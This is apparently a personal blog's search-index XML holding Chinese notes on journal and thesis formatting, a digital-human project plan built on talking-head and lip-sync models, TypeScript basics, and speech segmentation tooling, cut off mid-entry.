<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>论文写作纪要</title>
      <link href="/2023/05/29/%E8%AE%BA%E6%96%87%E5%86%99%E4%BD%9C%E7%BA%AA%E8%A6%81/"/>
      <url>/2023/05/29/%E8%AE%BA%E6%96%87%E5%86%99%E4%BD%9C%E7%BA%AA%E8%A6%81/</url>
      
        <content type="html"><![CDATA[<blockquote><h1 id="免责声明！"><a href="#免责声明！" class="headerlink" title="免责声明！"></a>免责声明！</h1><p>本文攥写主要用于自用记录，以防遗忘，不保证准确性。面向对象主要是学术小白（巧了，本人就是）。</p><p>不才发觉，有些东西不记录下来，过几天就忘记了。</p><p>非常麻烦。</p></blockquote><h1 id="用什么写论文"><a href="#用什么写论文" class="headerlink" title="用什么写论文"></a>用什么写论文</h1><p>如果是最终给PDF格式，有三种选择</p><ul><li>word&#x2F;wps（有没有模板都要改到哭）</li><li>latex（最好有模板，不然就等着哭）</li><li>markdown<del>?这个真的能用吗</del> 这个东西算是word和latex的折中了。直接编辑器和编程类编辑器最好打一架</li></ul><h1 id="中文期刊"><a href="#中文期刊" class="headerlink" title="中文期刊"></a>中文期刊</h1><h2 id="最终的格式修正"><a href="#最终的格式修正" class="headerlink" title="最终的格式修正"></a>最终的格式修正</h2><p>以中国图像图形学报为例</p><p>例如，本人收到的最后的格式修改编辑意见如下所示：</p><blockquote><p>1）论文中的作者，只需要保留姓氏，例如J. Zhu等人(2018)提出了HiDDeN(Hiding Data with Deep Networks)………… 要改为 Zhu等人</p><p>(2018)提出了</p><p>2）为方便编辑加工，请作者将文中所有公式和符号使用Mathtype重新撰写</p><p>3）请作者按照体例要求对公式及变量的格式进行检查修改，格式要求：变量用斜体； 矩阵,矢量,向量,集合，数组，图像用黑斜体</p><p>（黑即为加粗）； R(实数集),Z(整数集),N(自然数集)用正黑体； 且各变量要求加以说明，标准函数用正体</p><p>4）避免使用方法的英文名称或英文缩写作为变量名和下标，尽量使用1-2个字母表示，例如公式1</p><p>5）公式下对式中变量的说明，其前的“其中”统一为“式中”</p><p>6）表1 的算法加上参考文献</p><p>7）论文陈述的主语采用第三人称，不建议使用：我们等</p><p>8）建议作者增加中文参考文献</p></blockquote><ul><li><p>文献引用方式为<strong>一作姓氏</strong>  + 等人  +(年份)</p></li><li><p>首先出现英文缩写添加全称，大小写个人认为是需要和缩写一致的</p></li><li><p>使用Math-type写公式，wsp用户需要添加Math-type插件，WPS自带的公式编辑器不管用。我看官网上面的论文在线浏览，编辑似乎在所有能够加超链接的地方全部加入了超链接。</p></li><li><p>主要注意变量用斜体，图像用黑斜体。</p></li><li><p>不能直接使用英文全写或者常用的缩写，作为变量名称，比如残差res、载体图像cover（cov）、篡改图tempered_picture之类就是不能使用的，就是使用变量名x,y,z一类的变量</p></li><li><p>公式说明用式中？我感觉很牵强，专利里面也用“其中”的描述，它也没说什么。</p></li><li><p>指标对比的那个表格，算法要加入引用，总之要统一描述。加入引用主要是方便读者找对于的方法。这个期刊也很奇葩，不让用编号[1]这种引用格式，估计找起来很麻烦。</p></li><li><p>该期刊要求少用第一人称，如我们等、本文、本算法这种描述。将提出的算法称为A算法，提出的创新点直接给个名词。这一点可能见仁见智了，可能是只有个别期刊那么要求。</p></li><li><p>因为是中文论文，据说是要求引用同期刊下的同领域文章，增加影响力。</p></li></ul><h2 id="参考文献修正（不才似乎一直没弄明白参考文献格式）"><a href="#参考文献修正（不才似乎一直没弄明白参考文献格式）" class="headerlink" title="参考文献修正（不才似乎一直没弄明白参考文献格式）"></a>参考文献修正（不才似乎一直没弄明白参考文献格式）</h2><p>详见<a href="http://www.cjig.cn/jig/ch/reader/view_news.aspx?id=20120907113607001">论文引用文献参考</a>，<strong>每个期刊的要求也不一样</strong></p><p>如中国图像图形学报，主要需要注意的点如下：</p><ul><li><p>不要用[1]  [2]这种格式</p></li><li><p>引用排序按照作者首字母排序（这个可以写代码排序）</p></li><li><p>需要DOI，能找到DOI的全部都要，找不到的就算了</p></li><li><p>还有奇奇怪怪的要求就是一些标签如年份，卷期号的位置有些不一样</p></li></ul><h3 id="常规要求"><a href="#常规要求" class="headerlink" title="常规要求"></a>常规要求</h3><blockquote><p>（Liu X D and Chen Z Q. 2004. Research on several key problems in face recognition. Journal of Computer Research and Development，41(7)：1074-1080 (刘向东，陈兆乾.2004.人脸识别技术的研究. 计算机研究与发展， 41(7)：1074-1080) [ DOI:10.3969&#x2F;j.issn.1008-178X-B.2004.04.014]）</p></blockquote><ul><li>如这篇文章，作者这块，要求  姓 名 的次序要全部一致。部分格式要求：不能出现”and”，全部使用逗号分割作者。</li><li>缩写如CVPR,ICCV格式统一，全部删除或者全部保留，建议全部删除</li><li>如果是页码这里只有一页，比如7，需要注意可能是论文编号，需要使用No.7替换</li><li>尽量不要使用arXiv引用，替换为正式的期刊或会议，因为这类引用很麻烦，没有权威专家认证，而且电子数据库这种引用又不一样。</li></ul><h3 id="大写"><a href="#大写" class="headerlink" title="大写"></a>大写</h3><ul><li>论文标题首字母大写</li><li>所有缩写全部大写，比如JPEG、DNN。</li><li>作者姓名首字母大写</li><li>期刊名称，除了介词and,of这类的全部首字母大写</li></ul><h1 id="中文毕业论文"><a href="#中文毕业论文" class="headerlink" title="中文毕业论文"></a>中文毕业论文</h1><h2 id="章节安排"><a href="#章节安排" class="headerlink" title="章节安排"></a>章节安排</h2><blockquote><p>可能不同学历的结构不一样，这里说的是学士论文。比如我看博士论文就不一样，它的结构是每一个创新点都要一个单独的章节，相关工作、算法原理、实验内容与结果全部都是单独讲的。</p></blockquote><p>这里是一般的算法类毕业论文章节安排，其他的软开类我不是很了解。</p><ul><li>第一章：绪论，介绍本文的研究背景与意义，以及新时代中数字水印面临的新挑战和新机遇。</li><li>第二章：研究现状，主要介绍了现有的主要解决方案。（所有的别人的东西全部在这里面说完）</li><li>第三章：算法实现原理，主要介绍本算法实现原理。</li><li>第四章：实验结果与分析，主要介绍本算法的定性和定量结果以及本算法与其他算法的指标对比。</li><li>第五章：总结与展望：归纳本文研究工作，总结本算法创新点和局限性，并给出未来在本文基础上进一步研究的方向。</li></ul><h2 id="常见修改意见"><a href="#常见修改意见" class="headerlink" title="常见修改意见"></a>常见修改意见</h2><blockquote><p>1.中英文逗号，写完之后查询一遍，在中文中查询英文标点符合，在英文中查询中文标点符合</p><p>2.图小标题的abcd在正文中出现要加括号</p><p>3.图表全部居中</p><p>4.公式介绍中的变量要和公式里完全一样</p><p>5.目录内容不能重复</p><p>6.图里面名称太长就分行</p><p>7.标号后面加空格</p><p>8.图的要清晰，调大一点</p><p>9.图不要有太多空白</p></blockquote><blockquote><p>1.超像素分割与超像素不同，前者是一种技术方法，后者是一种表达形式，要表述准确</p><p>2.第三章名字改为算法设计与实现</p><p>3.3.1节边缘注意力应考虑调整顺序</p><p>4.4.1节实现细节与参数设置应调整到第三章</p><p>5.在章节小结中不应用 “第x.x节说明了…” 这种方式来描述，而是用“先…，其次…，最后…”来描述</p><p>6.注意章节总起与章节小结的时态</p><p>7.最终的总结章是对毕设工作的总结，而不是对文章的总结，展望字数太少</p><p>8.patch改为图像块</p><p>9.公式内部不要有多余空格，名字不要取太长</p><p>10.图像中名称尽量要用中文</p><p>11.网络结构要具体，具体到每一层的尺寸</p><p>12.中英文冒号注意区分</p><p>13.一句话连续出现两个“的”就要考虑是不是有问题</p><p>14.“以及”一般是a，b以及c，如果只有两个应该是a和b</p><p>15.首次提到论文应该是 中文（英文全称，英文缩写）</p></blockquote><blockquote><ol><li><pre><code>英文翻译杜绝中文式英文，特别是长名词组成的一串术语。例</code></pre><p>迭代优化标注方法：<br>错误翻译：iterative optimization labeling method<br>正确翻译：iterative optimization based labeling method</p></li><li><pre><code>每章总起的语态不要使完成时，比如：</code></pre><p>本章介绍了× 本章介绍√<br>了代表完成，应该在本章小结中出现，不应该在本章总起中出现。</p></li><li><pre><code>术语要全称，比如二阶段检测器全称不能说二阶段，并且不能频繁切换，比如一阶段检测器和端到端检测器一般要统称，不能一个地方用一阶段另一个地方用端到端。</code></pre></li><li><pre><code>引用放在最后，</code></pre><p>例:Relation[4]方法× Relation方法[4]√</p></li><li><pre><code>本章小结和每章总起的内容不要重合，可以使用首先..其次..最后..句式。</code></pre></li><li><pre><code>图不能超过页边距，可以裁剪一下，图注上下居中。</code></pre></li><li><pre><code>主语问题仍然要仔细纠正。</code></pre></li><li><pre><code>labeling可以在最后提供链接，labelimg是本文使用的数据标注框架。</code></pre></li><li><pre><code>所有图片中的字体，如果正文中有出现，要在格式上保持统一。</code></pre></li></ol><p>10.英文术语第一次出现要解释，或者翻译成中午后接括号解释。例：epoch map baseline anchor_free batch_size milestones等。</p><ol start="11"><li><pre><code>公式中下面紧跟的是一段话，要顶格写。</code></pre></li><li><pre><code>表格 average precision 换成中文。</code></pre></li></ol><p>13.参考文献题目的大小写要统一。</p></blockquote><p>有以下要点：</p><ul><li>图片题目要求具体，有多种方法同时出现的需要加入算法名称，和关键词。不能出现完全相同的题目，即使的相似的内容。</li><li>注意模板要求的图片名称格式要求，如<u>图3.1 算法流程图</u> 这里的空格有时候在图后面，有时候是3.1的后面。<u>图4.9 在攻击情形下的本文算法提取水印信息（复合攻击1表示加入噪声、高斯模糊和亮度调整攻击；复合攻击2表示加入噪声、高斯模糊和亮度调整和扭曲攻击；复合攻击3表示加入噪声、高斯模糊和亮度调整攻击和放大攻击）</u>  像是这样长的标题也是可以的。</li><li>减少口语化描述，比如“但”-》”但是“</li></ul><h2 id="章节"><a href="#章节" class="headerlink" title="章节"></a>章节</h2><ul><li>正文目录尽量要求长度相等，例如</li></ul><blockquote><p><a href="#_Toc17157">摘 要</a></p><p><a href="#_Toc13983">Abstract</a></p><p><a href="#_Toc27281">图片目录</a></p><p><a href="#_Toc4841">表格目录</a></p><p><a href="#_Toc15373">正文目录</a></p><p><a href="#_Toc19978">第1章 绪论</a></p><p><a href="#_Toc21506">1.1 背景与意义</a></p><p><a href="#_Toc8639">1.2 内容与创新</a></p><p><a href="#_Toc8009">1.3 章节安排</a></p><p><a href="#_Toc8542">1.4 本章小结</a></p></blockquote><ul><li><p>还有就是章节内部和文章结构全部采用总分总结构。意思就是章节开头写总起（这个不用另起一个二级标题）（本章先介绍。。。**<u>注意没有“了”,是未来时</u><strong>），章节最后写一个本章小结，比如3.9 本章小结（本章主要介绍了。。。，</strong>采用现在完成时**）</p></li><li><p>章节之间采用分页符间隔。</p></li></ul><h2 id="公式使用"><a href="#公式使用" class="headerlink" title="公式使用"></a>公式使用</h2><p><img src="/%E8%AE%BA%E6%96%87%E5%86%99%E4%BD%9C%E7%BA%AA%E8%A6%81/image-20230531004228210.png" alt="image-20230531004228210"></p><p>关于公式使用，我始终秉持着这个观点——按照专利的要求，最死板的逻辑来，即所有出现的符号全部要解释说明，包括那种约定俗成的符号，比如求梯度的那个倒三角，范数等。</p><ul><li>全部使用公式编辑器</li><li>所有符号解释清除</li><li>公式主体<strong>居中</strong>，公式编号<strong>靠右</strong>。注意如(3-22)靠最右，这个公式实际上是设置了<em><strong>段落右对齐</strong></em>的</li><li>按照专利要求 <strong>中文+符号</strong> 称呼变量，注意统一叫法</li></ul><h2 id="图片"><a href="#图片" class="headerlink" title="图片"></a>图片</h2><blockquote><p>什么是图片？就是里面塞了图的都是图片，就算把图片塞得和表格一样都是图片，不是表。</p></blockquote><p><img src="/%E8%AE%BA%E6%96%87%E5%86%99%E4%BD%9C%E7%BA%AA%E8%A6%81/image-20230531005124519.png" alt="image-20230531005124519"></p><ul><li>图片标题在下，表格标题在上</li><li>打开WPS网格模式，图片不能超出网格边缘（页边），所述网格边缘是留边空白的边线。</li><li>图片内部字体要求比正文字体小一号（正文使用小四号，图片内部使用五号字体），注意是图里面所有字，包括网络结构示意图和图例、图片标题里面的字体</li><li>英文用Time New Romer,中文用宋体。</li><li>奇奇怪怪的图标题和图的行距，反正我这里是0.5行+单倍。</li><li>图片和上面正文空0.5行距</li><li>图片小标题使用行居中对齐（就是在表格工具-对齐方式里面）</li><li>一般要求图片紧贴表格边框，设置表格选项-单元格边距均为0。</li><li>据说有些人酷爱在图片周围加阴影，加立体感，就是下图这种感觉。我感觉也还行</li></ul><p><img src="/%E8%AE%BA%E6%96%87%E5%86%99%E4%BD%9C%E7%BA%AA%E8%A6%81/image-20230531224040433.png" alt="image-20230531224040433"></p><h2 id="表格"><a href="#表格" class="headerlink" title="表格"></a>表格</h2><p>没啥好讲的，基本要求和图片相似。</p><p>可以采用以下方法表示</p><ul><li><table><thead><tr><th>算法</th><th>ACC↑(O&#x2F;W)</th><th>F1↑(O&#x2F;W)</th><th>PSNR↑</th><th>SSIM↑</th></tr></thead><tbody><tr><td></td><td></td><td></td><td></td><td></td></tr></tbody></table></li><li><p>↑ 表示正相关和负相关关系</p></li><li><p>(O&#x2F;W)表示有无攻击</p></li><li><p>算法栏描述时候需要添加引用文献，最好是加了标号的。</p></li><li><p>同时也是设置行居中对齐</p></li><li><p>0.5行+单倍行距</p></li><li><p>段后与正文 空0.5行</p></li></ul><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>就先说这些吧，不过比起这些奇技淫巧，最重要的还是把事情讲清楚，把算法真正做好。</p>]]></content>
      
      
      
        <tags>
            
            <tag> paper，奇技淫巧 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数字人企划</title>
      <link href="/2023/05/20/virture-human/"/>
      <url>/2023/05/20/virture-human/</url>
      
        <content type="html"><![CDATA[<h1 id="虚拟人计划"><a href="#虚拟人计划" class="headerlink" title="虚拟人计划"></a>虚拟人计划</h1><p>注意，是数字人，不是皮套人</p><h2 id="https-github-com-pkhungurn-talking-head-anime-demo"><a href="#https-github-com-pkhungurn-talking-head-anime-demo" class="headerlink" title="https://github.com/pkhungurn/talking-head-anime-demo"></a><a href="https://github.com/pkhungurn/talking-head-anime-demo">https://github.com/pkhungurn/talking-head-anime-demo</a></h2><ul><li><p>一张图生成，摄像头动补，也可以通过256 * 256大小的png图像生成可调整的形象</p></li><li><p>动补不过通过face detection计算出这些参数 </p><p><img src="/virture-human/waifu_00_256.png" alt="waifu_00_256"></p></li></ul><p><img src="/virture-human/image-20230427093922109.png" alt="image-20230427093922109"></p><h2 id="VRoid-Hub-amp-amp-VUP软件"><a href="#VRoid-Hub-amp-amp-VUP软件" class="headerlink" title="VRoid Hub  &amp;&amp; VUP软件"></a>VRoid Hub  &amp;&amp; VUP软件</h2><ul><li>VRoid Hub捏脸和建模</li></ul><img src="https://picx.zhimg.com/80/v2-6a5558b4c926e17bf4008ef991dbcc1b_1440w.webp?source=1940ef5c" alt="img" style="zoom:33%;"><ul><li>VUP如果可以二次开发，就可以很简单完成</li></ul><img src="https://pic1.zhimg.com/80/v2-7a5a947f4ebba3759bbeb232ab0cb0cd_1440w.webp?source=1940ef5c" alt="img" style="zoom:33%;"><ul><li><p><a href="https://www.zhihu.com/zvideo/1604154088907755520">Wav2Lip</a>  声音-嘴唇同步论文</p></li><li><p>elai. 付费软件 不行，垃圾软件</p></li><li><p>MetaHuman Unreal Engine 5 免费软件3D建模软件</p></li></ul><h1 id="方案1"><a href="#方案1" class="headerlink" title="方案1"></a>方案1</h1><p>使用Learning Realistic 3D Motion Coefficients for Stylized Audio-Driven Single Image Talking Face Animation</p><p>sad talking方案。通过一张图像+一段音频生成一段说话的视频。视频时长等于音频时长</p><p><img src="/virture-human/image-20230427100809715.png" alt="image-20230427100809715"></p><ul><li><p>对该方案的二次开发</p></li><li><p>要能聊天</p></li><li><p>接入语音接口，就是之前trump的音色接口，把语音转换为trump，trump的接口为语音-语音(录制音频（长度小于45秒）)</p></li><li><pre><code class="python">drien_audio = trump_api(driven_audio)  </code></pre></li><li><p>接入chart gpt接口，自动生成语音&#x2F;文字（能聊天）   输入为文字-输出为文字-再转为语音</p></li><li><p>只使用inference.py接口</p></li></ul><h1 id="paddle-方案"><a href="#paddle-方案" class="headerlink" title="paddle 方案"></a>paddle 方案</h1><p><img src="/virture-human/image-20230428105654414.png" alt="image-20230428105654414"></p><p>不是很复杂的方案——paddle虚拟数字主播播新闻</p><ul><li><p><a href="https://aistudio.baidu.com/aistudio/projectdetail/6064213?forkThirdPart=1">https://aistudio.baidu.com/aistudio/projectdetail/6064213?forkThirdPart=1</a></p></li><li><p>使用FOM模型实现表情迁移，也就是复制某个MP4中的表情，看似和语音相关，实际上不相关。看起来</p></li><li><p>使用TTS实现文本转语音  (这个在codelab上面有些问题，包的版本问题)</p></li><li><p>使用wav2lip实现唇形合成</p></li></ul><h1 id="突然想到一件事情"><a href="#突然想到一件事情" class="headerlink" title="突然想到一件事情"></a>突然想到一件事情</h1><ul><li>可以外接虚拟语音助手</li><li>通过图片+声音-嘴唇转换完成</li></ul><h1 id="更换已有虚拟主播的皮套"><a href="#更换已有虚拟主播的皮套" class="headerlink" title="更换已有虚拟主播的皮套"></a>更换已有虚拟主播的皮套</h1><p><a href="https://github.com/cdfmlr/muvtuber">https://github.com/cdfmlr/muvtuber</a></p><p>可能只需要改换public项目下的资源即可</p><ul><li>现有虚拟形象</li></ul><p><img src="/virture-human/image-20230526135648087.png" alt="image-20230526135648087"></p><ul><li>改变虚拟形象,看起来改变虚拟形象对我而言过于麻烦了</li><li>断网可用，已实验</li></ul><h1 id="实际上github似乎有现成的demo"><a href="#实际上github似乎有现成的demo" class="headerlink" title="实际上github似乎有现成的demo"></a>实际上github似乎有现成的demo</h1><ul><li><p>桌面精灵<a href="https://github.com/zenghongtu/PPet">https://github.com/zenghongtu/PPet</a></p></li><li><p>【AI桌面精灵V1.0，支持用户高度自定义】 <a href="https://www.bilibili.com/video/BV1Lo4y147x3/?share_source=copy_web&amp;vd_source=9052d46a90459e2586b46cdaff2721d8">https://www.bilibili.com/video/BV1Lo4y147x3/?share_source=copy_web&amp;vd_source=9052d46a90459e2586b46cdaff2721d8</a></p></li><li><p>现成的数字人项目，可惜需要openAI的aip key,<a href="https://github.com/Voine/ChatWaifu_Mobile%EF%BC%8C%E6%94%BE%E5%9C%A8Andoid%E4%B8%8A%E9%9D%A2%E7%9A%84%EF%BC%8C%E9%9C%80%E8%A6%81%E5%BC%84%E4%B8%80%E4%B8%AA%E6%A8%A1%E6%8B%9F%E5%99%A8">https://github.com/Voine/ChatWaifu_Mobile，放在Andoid上面的，需要弄一个模拟器</a></p></li></ul><h1 id="更改gradio中的参数"><a href="#更改gradio中的参数" class="headerlink" title="更改gradio中的参数"></a>更改gradio中的参数</h1><ul><li>比如upload和microphone改变直接上传语音或者录制语音</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> Python，AI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ts</title>
      <link href="/2023/05/14/ts/"/>
      <url>/2023/05/14/ts/</url>
      
        <content type="html"><![CDATA[<h1 id="TypeScript"><a href="#TypeScript" class="headerlink" title="TypeScript"></a>TypeScript</h1><ul><li>可能比js要厉害一点</li><li>我看这个东西能够生成js</li><li>听说php，js的漏洞不少，什么弱类型的我也是略知一二的，不知道ts有没有这种，据知乎说ts是比较安全的语言</li><li>这个是含分号语言</li><li>需要编译，从ts编译到js，属于编译型语言，和python的解释型语言不同，不能跑一半</li></ul><h2 id="目的"><a href="#目的" class="headerlink" title="目的"></a>目的</h2><p>想要魔改某个live2d项目，该项目是基于ts写的一个前端。</p><p>不才对于ts和前端可是一窍不通</p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install -g typescript</span><br></pre></td></tr></table></figure><h2 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h2><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> <span class="attr">message</span>:<span class="built_in">string</span> = <span class="string">&quot;hello world&quot;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(message)</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tsc app.ts</span><br></pre></td></tr></table></figure><p>可以生成js文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">node app.js</span><br></pre></td></tr></table></figure><p>可以使用node执行，就是输出helllo world的日志</p><p><img src="/ts/image-20230514192310878.png" alt="image-20230514192310878"></p><ul><li>请注意，vscode和pycharm不一样，vscode一定要save才会save的，或者需要设置，像是pycharm就不错</li></ul><h2 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h2><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="attr">flag</span>: <span class="built_in">boolean</span> = <span class="literal">true</span>;</span><br><span class="line"><span class="comment">//使用单引号（&#x27;）或双引号（&quot;）来表示字符串类型。反引号（`）来定义多行文本和内嵌表达式。</span></span><br><span class="line"><span class="keyword">let</span> <span class="attr">name</span>: <span class="built_in">string</span> = <span class="string">&quot;Runoob&quot;</span>;</span><br><span class="line"><span class="keyword">let</span> <span class="attr">words</span>: <span class="built_in">string</span> = <span class="string">`您好，今年是 <span class="subst">$&#123; name &#125;</span> 发布 <span class="subst">$&#123; years + <span class="number">1</span>&#125;</span> 周年`</span>;</span><br><span class="line"><span class="comment">// number  数字类型，实际上是双精度浮点类型 ,数字类型只有number，不存在int,double之类的</span></span><br><span class="line"><span class="keyword">let</span> <span class="attr">years</span>: <span class="built_in">number</span> = <span class="number">5</span>;</span><br><span class="line"><span class="comment">// string</span></span><br><span class="line"><span class="keyword">let</span> <span class="attr">words</span>: <span class="built_in">string</span> = <span class="string">`您好，今年是 <span class="subst">$&#123; name &#125;</span> 发布 <span class="subst">$&#123; years + <span class="number">1</span>&#125;</span> 周年`</span>;</span><br><span class="line"><span class="comment">// 元组</span></span><br><span class="line"><span class="keyword">let</span> <span class="attr">x</span>: [<span class="built_in">string</span>, <span class="built_in">number</span>];</span><br><span class="line">x = [<span class="string">&#x27;Runoob&#x27;</span>, <span class="number">1</span>]; </span><br><span class="line"><span class="comment">// any类型，不明或者会动态改变的</span></span><br><span class="line"><span class="keyword">let</span> x :<span class="built_in">any</span>=<span class="number">1</span>;</span><br><span class="line">x = <span class="string">&#x27;i  am who i am&#x27;</span></span><br><span class="line">x= <span class="literal">false</span>; <span class="comment">// 不出错，语法检查会跳过any类型</span></span><br></pre></td></tr></table></figure><p>数据需要声明，采用”let 名称：类型“的形式 </p><h2 id="printf"><a href="#printf" class="headerlink" title="printf"></a>printf</h2><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(内容)</span><br></pre></td></tr></table></figure><p>就是ts里面的print</p><h2 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h2><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;  <span class="comment">// 表示无符号右移</span></span><br><span class="line">&gt;&gt;  <span class="comment">// 有符号右移</span></span><br></pre></td></tr></table></figure><p>其他各符号和正常语言相同</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> <span class="attr">num</span>:<span class="built_in">number</span>=<span class="number">12</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="keyword">typeof</span> num) <span class="comment">//输出结果: number</span></span><br></pre></td></tr></table></figure><h3 id="lamba表达式"><a href="#lamba表达式" class="headerlink" title="lamba表达式"></a>lamba表达式</h3><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> <span class="title function_">foo</span> = (<span class="params">x:<span class="built_in">number</span></span>)=&gt;<span class="number">10</span>+x</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">foo</span>(<span class="number">100</span>));  <span class="comment">//110</span></span><br></pre></td></tr></table></figure><h2 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h2><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> <span class="attr">ss</span>:<span class="built_in">number</span>[]=[<span class="number">1</span>,<span class="number">22</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>]</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> val <span class="keyword">in</span> ss)&#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(ss[val]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> <span class="attr">j</span>:<span class="built_in">any</span>; <span class="comment">// var j:string;// 也行</span></span><br><span class="line"><span class="keyword">var</span> <span class="attr">n</span>:<span class="built_in">any</span> = <span class="string">&quot;a b c&quot;</span> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span>(j <span class="keyword">in</span> n) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(n[j])  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>给出的j是数组下标</strong></p><p>for…of 语句创建一个循环来迭代可迭代的对象</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> someArray = [<span class="number">1</span>, <span class="string">&quot;string&quot;</span>, <span class="literal">false</span>];</span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> entry <span class="keyword">of</span> someArray) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(entry); <span class="comment">// 1, &quot;string&quot;, false</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> <span class="title function_">foo</span> = (<span class="params">x:<span class="built_in">number</span></span>)=&gt; &#123;    </span><br><span class="line">    x = <span class="number">10</span> + x </span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(x)  </span><br><span class="line">&#125; </span><br><span class="line"><span class="title function_">foo</span>(<span class="number">100</span>) <span class="comment">//110</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 前端 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>语音任务</title>
      <link href="/2023/05/13/%E8%AF%AD%E9%9F%B3%E4%BB%BB%E5%8A%A1/"/>
      <url>/2023/05/13/%E8%AF%AD%E9%9F%B3%E4%BB%BB%E5%8A%A1/</url>
      
        <content type="html"><![CDATA[<h1 id="语音"><a href="#语音" class="headerlink" title="语音"></a>语音</h1><ul><li>分割</li><li>转文字</li><li>文字-实际文字配对</li></ul><p> <strong>text-to-speech (TTS)</strong> </p><h1 id="VAD-python"><a href="#VAD-python" class="headerlink" title="VAD-python"></a>VAD-python</h1><p>需要给定一些超参数，如窗口等</p><p>改动该参数，不大行</p><h1 id="silero-vad-master"><a href="#silero-vad-master" class="headerlink" title="silero-vad-master"></a>silero-vad-master</h1><p>修改代码之后可以得到分离或者合并的声音</p><ul><li>run silero-vad.ipnb</li></ul><h1 id="语音识别"><a href="#语音识别" class="headerlink" title="语音识别"></a>语音识别</h1><p>​      <strong><a href="https://github.com/shibing624/parrots">parrots</a></strong></p><p>这个项目看web页面好像不大灵。</p><p>​      <strong><a href="https://github.com/chenmingxiang110/Chinese-automatic-speech-recognition">Chinese-automatic-speech-recognition</a></strong></p><h1 id="语音匹配"><a href="#语音匹配" class="headerlink" title="语音匹配"></a>语音匹配</h1><p>获取的翻译为utf-8编码，获取的gt为gbk编码</p><p>读写txt需要进行编码选择</p><p>exl表格语音-文本，需要成功匹配。</p><h2 id="剧本gt获取"><a href="#剧本gt获取" class="headerlink" title="剧本gt获取"></a>剧本gt获取</h2><p>通过splitewps.py，选取”角色：“为关键词。在splitewps.py中运行splite_word(word),注意word(<strong>角色名</strong>)中的关键词长度不同，不能直接通过[4:]的方式截取台词部分</p><p>其中，word为一个包含角色名的list</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># word=[&quot;辛倩：&quot;,&quot;安灵：&quot;,&quot;纪书兰：&quot;]</span><br><span class="line"># word = [&quot;关菡：&quot;]</span><br></pre></td></tr></table></figure><p>将不同角色的台词分离为以角色名命名的txt文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span 